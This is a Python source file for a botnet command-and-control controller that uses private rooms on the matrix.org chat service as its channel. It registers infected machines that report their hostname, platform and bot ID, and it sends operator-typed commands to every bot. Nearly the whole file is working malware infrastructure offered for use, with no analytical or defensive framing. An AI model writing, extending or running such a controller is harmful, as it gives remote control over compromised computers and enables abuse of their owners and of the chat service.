from typing import Self
import uuid
from matrix_client.client import MatrixClient, Room
from matrix_client.api import MatrixRequestError
from requests.exceptions import MissingSchema
import os
import sys
from dotenv import load_dotenv
import json
from dataclasses import dataclass

load_dotenv()
USER_NAME = os.getenv('USER_NAME')  
PASSWORD = os.getenv('PASSWORD')
ROOM_ID = os.getenv('ROOM_ID')
COMMAND_ROOM_ID = os.getenv('COMMAND_ROOM_ID')
MATRIX_HOMESERVER = "https://matrix.org"


@dataclass
class Bot:
    hostname: str
    platform: str
    platform_version: str
    machine: str
    bot_id: str
    python_version: str
    
    def __init__(self, data: dict):
        self.hostname = data.get("hostname", "UNKNOWN")
        self.platform = data.get("platform", "UNKNOWN")
        self.platform_version = data.get("platform_version", "UNKNOWN")
        self.machine = data.get("machine", "UNKNOWN")
        self.bot_id = data.get("bot_id", "UNKNOWN")
        self.python_version = data.get("python_version", "UNKNOWN")


class CommandRoom:
    bots: dict[str, Bot]
    room: Room
    
    def __init__(self, room):
        self.room = room
        self.bots = {}
        
    def __str__(self):
        return f"{self.bots}"
    
    def add_bot(self, bot_data) -> Bot:
        bot: Bot = Bot(bot_data)
        self.bots[bot.bot_id] = bot
        return bot
    
    def send_cmd(self, cmd):
        return self.room.send_text(cmd)
        

class BotnetController:
    access_token: str
    announce_room: Room
    command_rooms: dict[str, CommandRoom]
    
    def __init__(self):
        self.device_id = "BOTCONTROLLER"
        self.client = MatrixClient(MATRIX_HOMESERVER)
        self.command_rooms = {}

    def login(self):
        # login and sync
        try:
            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
            print("[+] Logged in as controller.")
        except MatrixRequestError as e:
            print(e)
            if e.code == 403:
                print("Bad username or password.")
                sys.exit(4)
            else:
                print("Check your sever details are correct.")
                sys.exit(2)
        except MissingSchema as e:
            print("Bad URL format.")
            print(e)
            sys.exit(3)
            
    def join_room(self, roomid) -> Room:
        try:
            room = self.client.rooms[roomid]
        except KeyError:
            room = self.client.join_room(roomid)
        return room
            
    def join_rooms(self):
        self.announce_room = self.join_room(ROOM_ID)
        for cmdroom in [COMMAND_ROOM_ID]:
            self.command_rooms[cmdroom] = CommandRoom(self.join_room(cmdroom))

    def send_command(self, command, room):
        response = room.send_cmd(f"COMMAND:{command}")
        # TODO: check for successfull response?
        print(f"[+] Sent command: {command}")
        
    def send_to_all(self, command):
        for id, cmd_room in self.command_rooms.items():
            self.send_command(command, cmd_room)
            
    def assign_bot(self, botdata, roomid):
        self.command_rooms[roomid].add_bot(botdata)

    def on_message(self, room, event):
        msgbody: str = event["content"]["body"]
        if msgbody.startswith("CONNECT"):
            msgbody = msgbody.removeprefix("CONNECT:")
            msgbody = json.loads(msgbody)
            botid = msgbody["bot_id"]
            self.announce_room.send_text(
                f"RESOLVE {botid}:{COMMAND_ROOM_ID}"
            )
            self.assign_bot(msgbody, COMMAND_ROOM_ID)
            
    def create_room(self, name) -> Room:
        return self.client.create_room(name, is_public=False)
    
    def add_command_room(self):
        new_room = self.create_room(f"commandroom{uuid.uuid4()}")
        self.command_rooms[new_room.room_id] = CommandRoom(new_room)
            
    def run(self):
        self.login()
        self.join_rooms()
        
        self.announce_room.add_listener(self.on_message)
        self.client.start_listener_thread()
        
        room = self.add_command_room()
        
        print("[+] Controller ready. Enter commands to send to bots.")
        while True:
            command = input("Enter command for bots: ")
            self.send_to_all(command)

if __name__ == "__main__":
    controller = BotnetController()
    controller.run()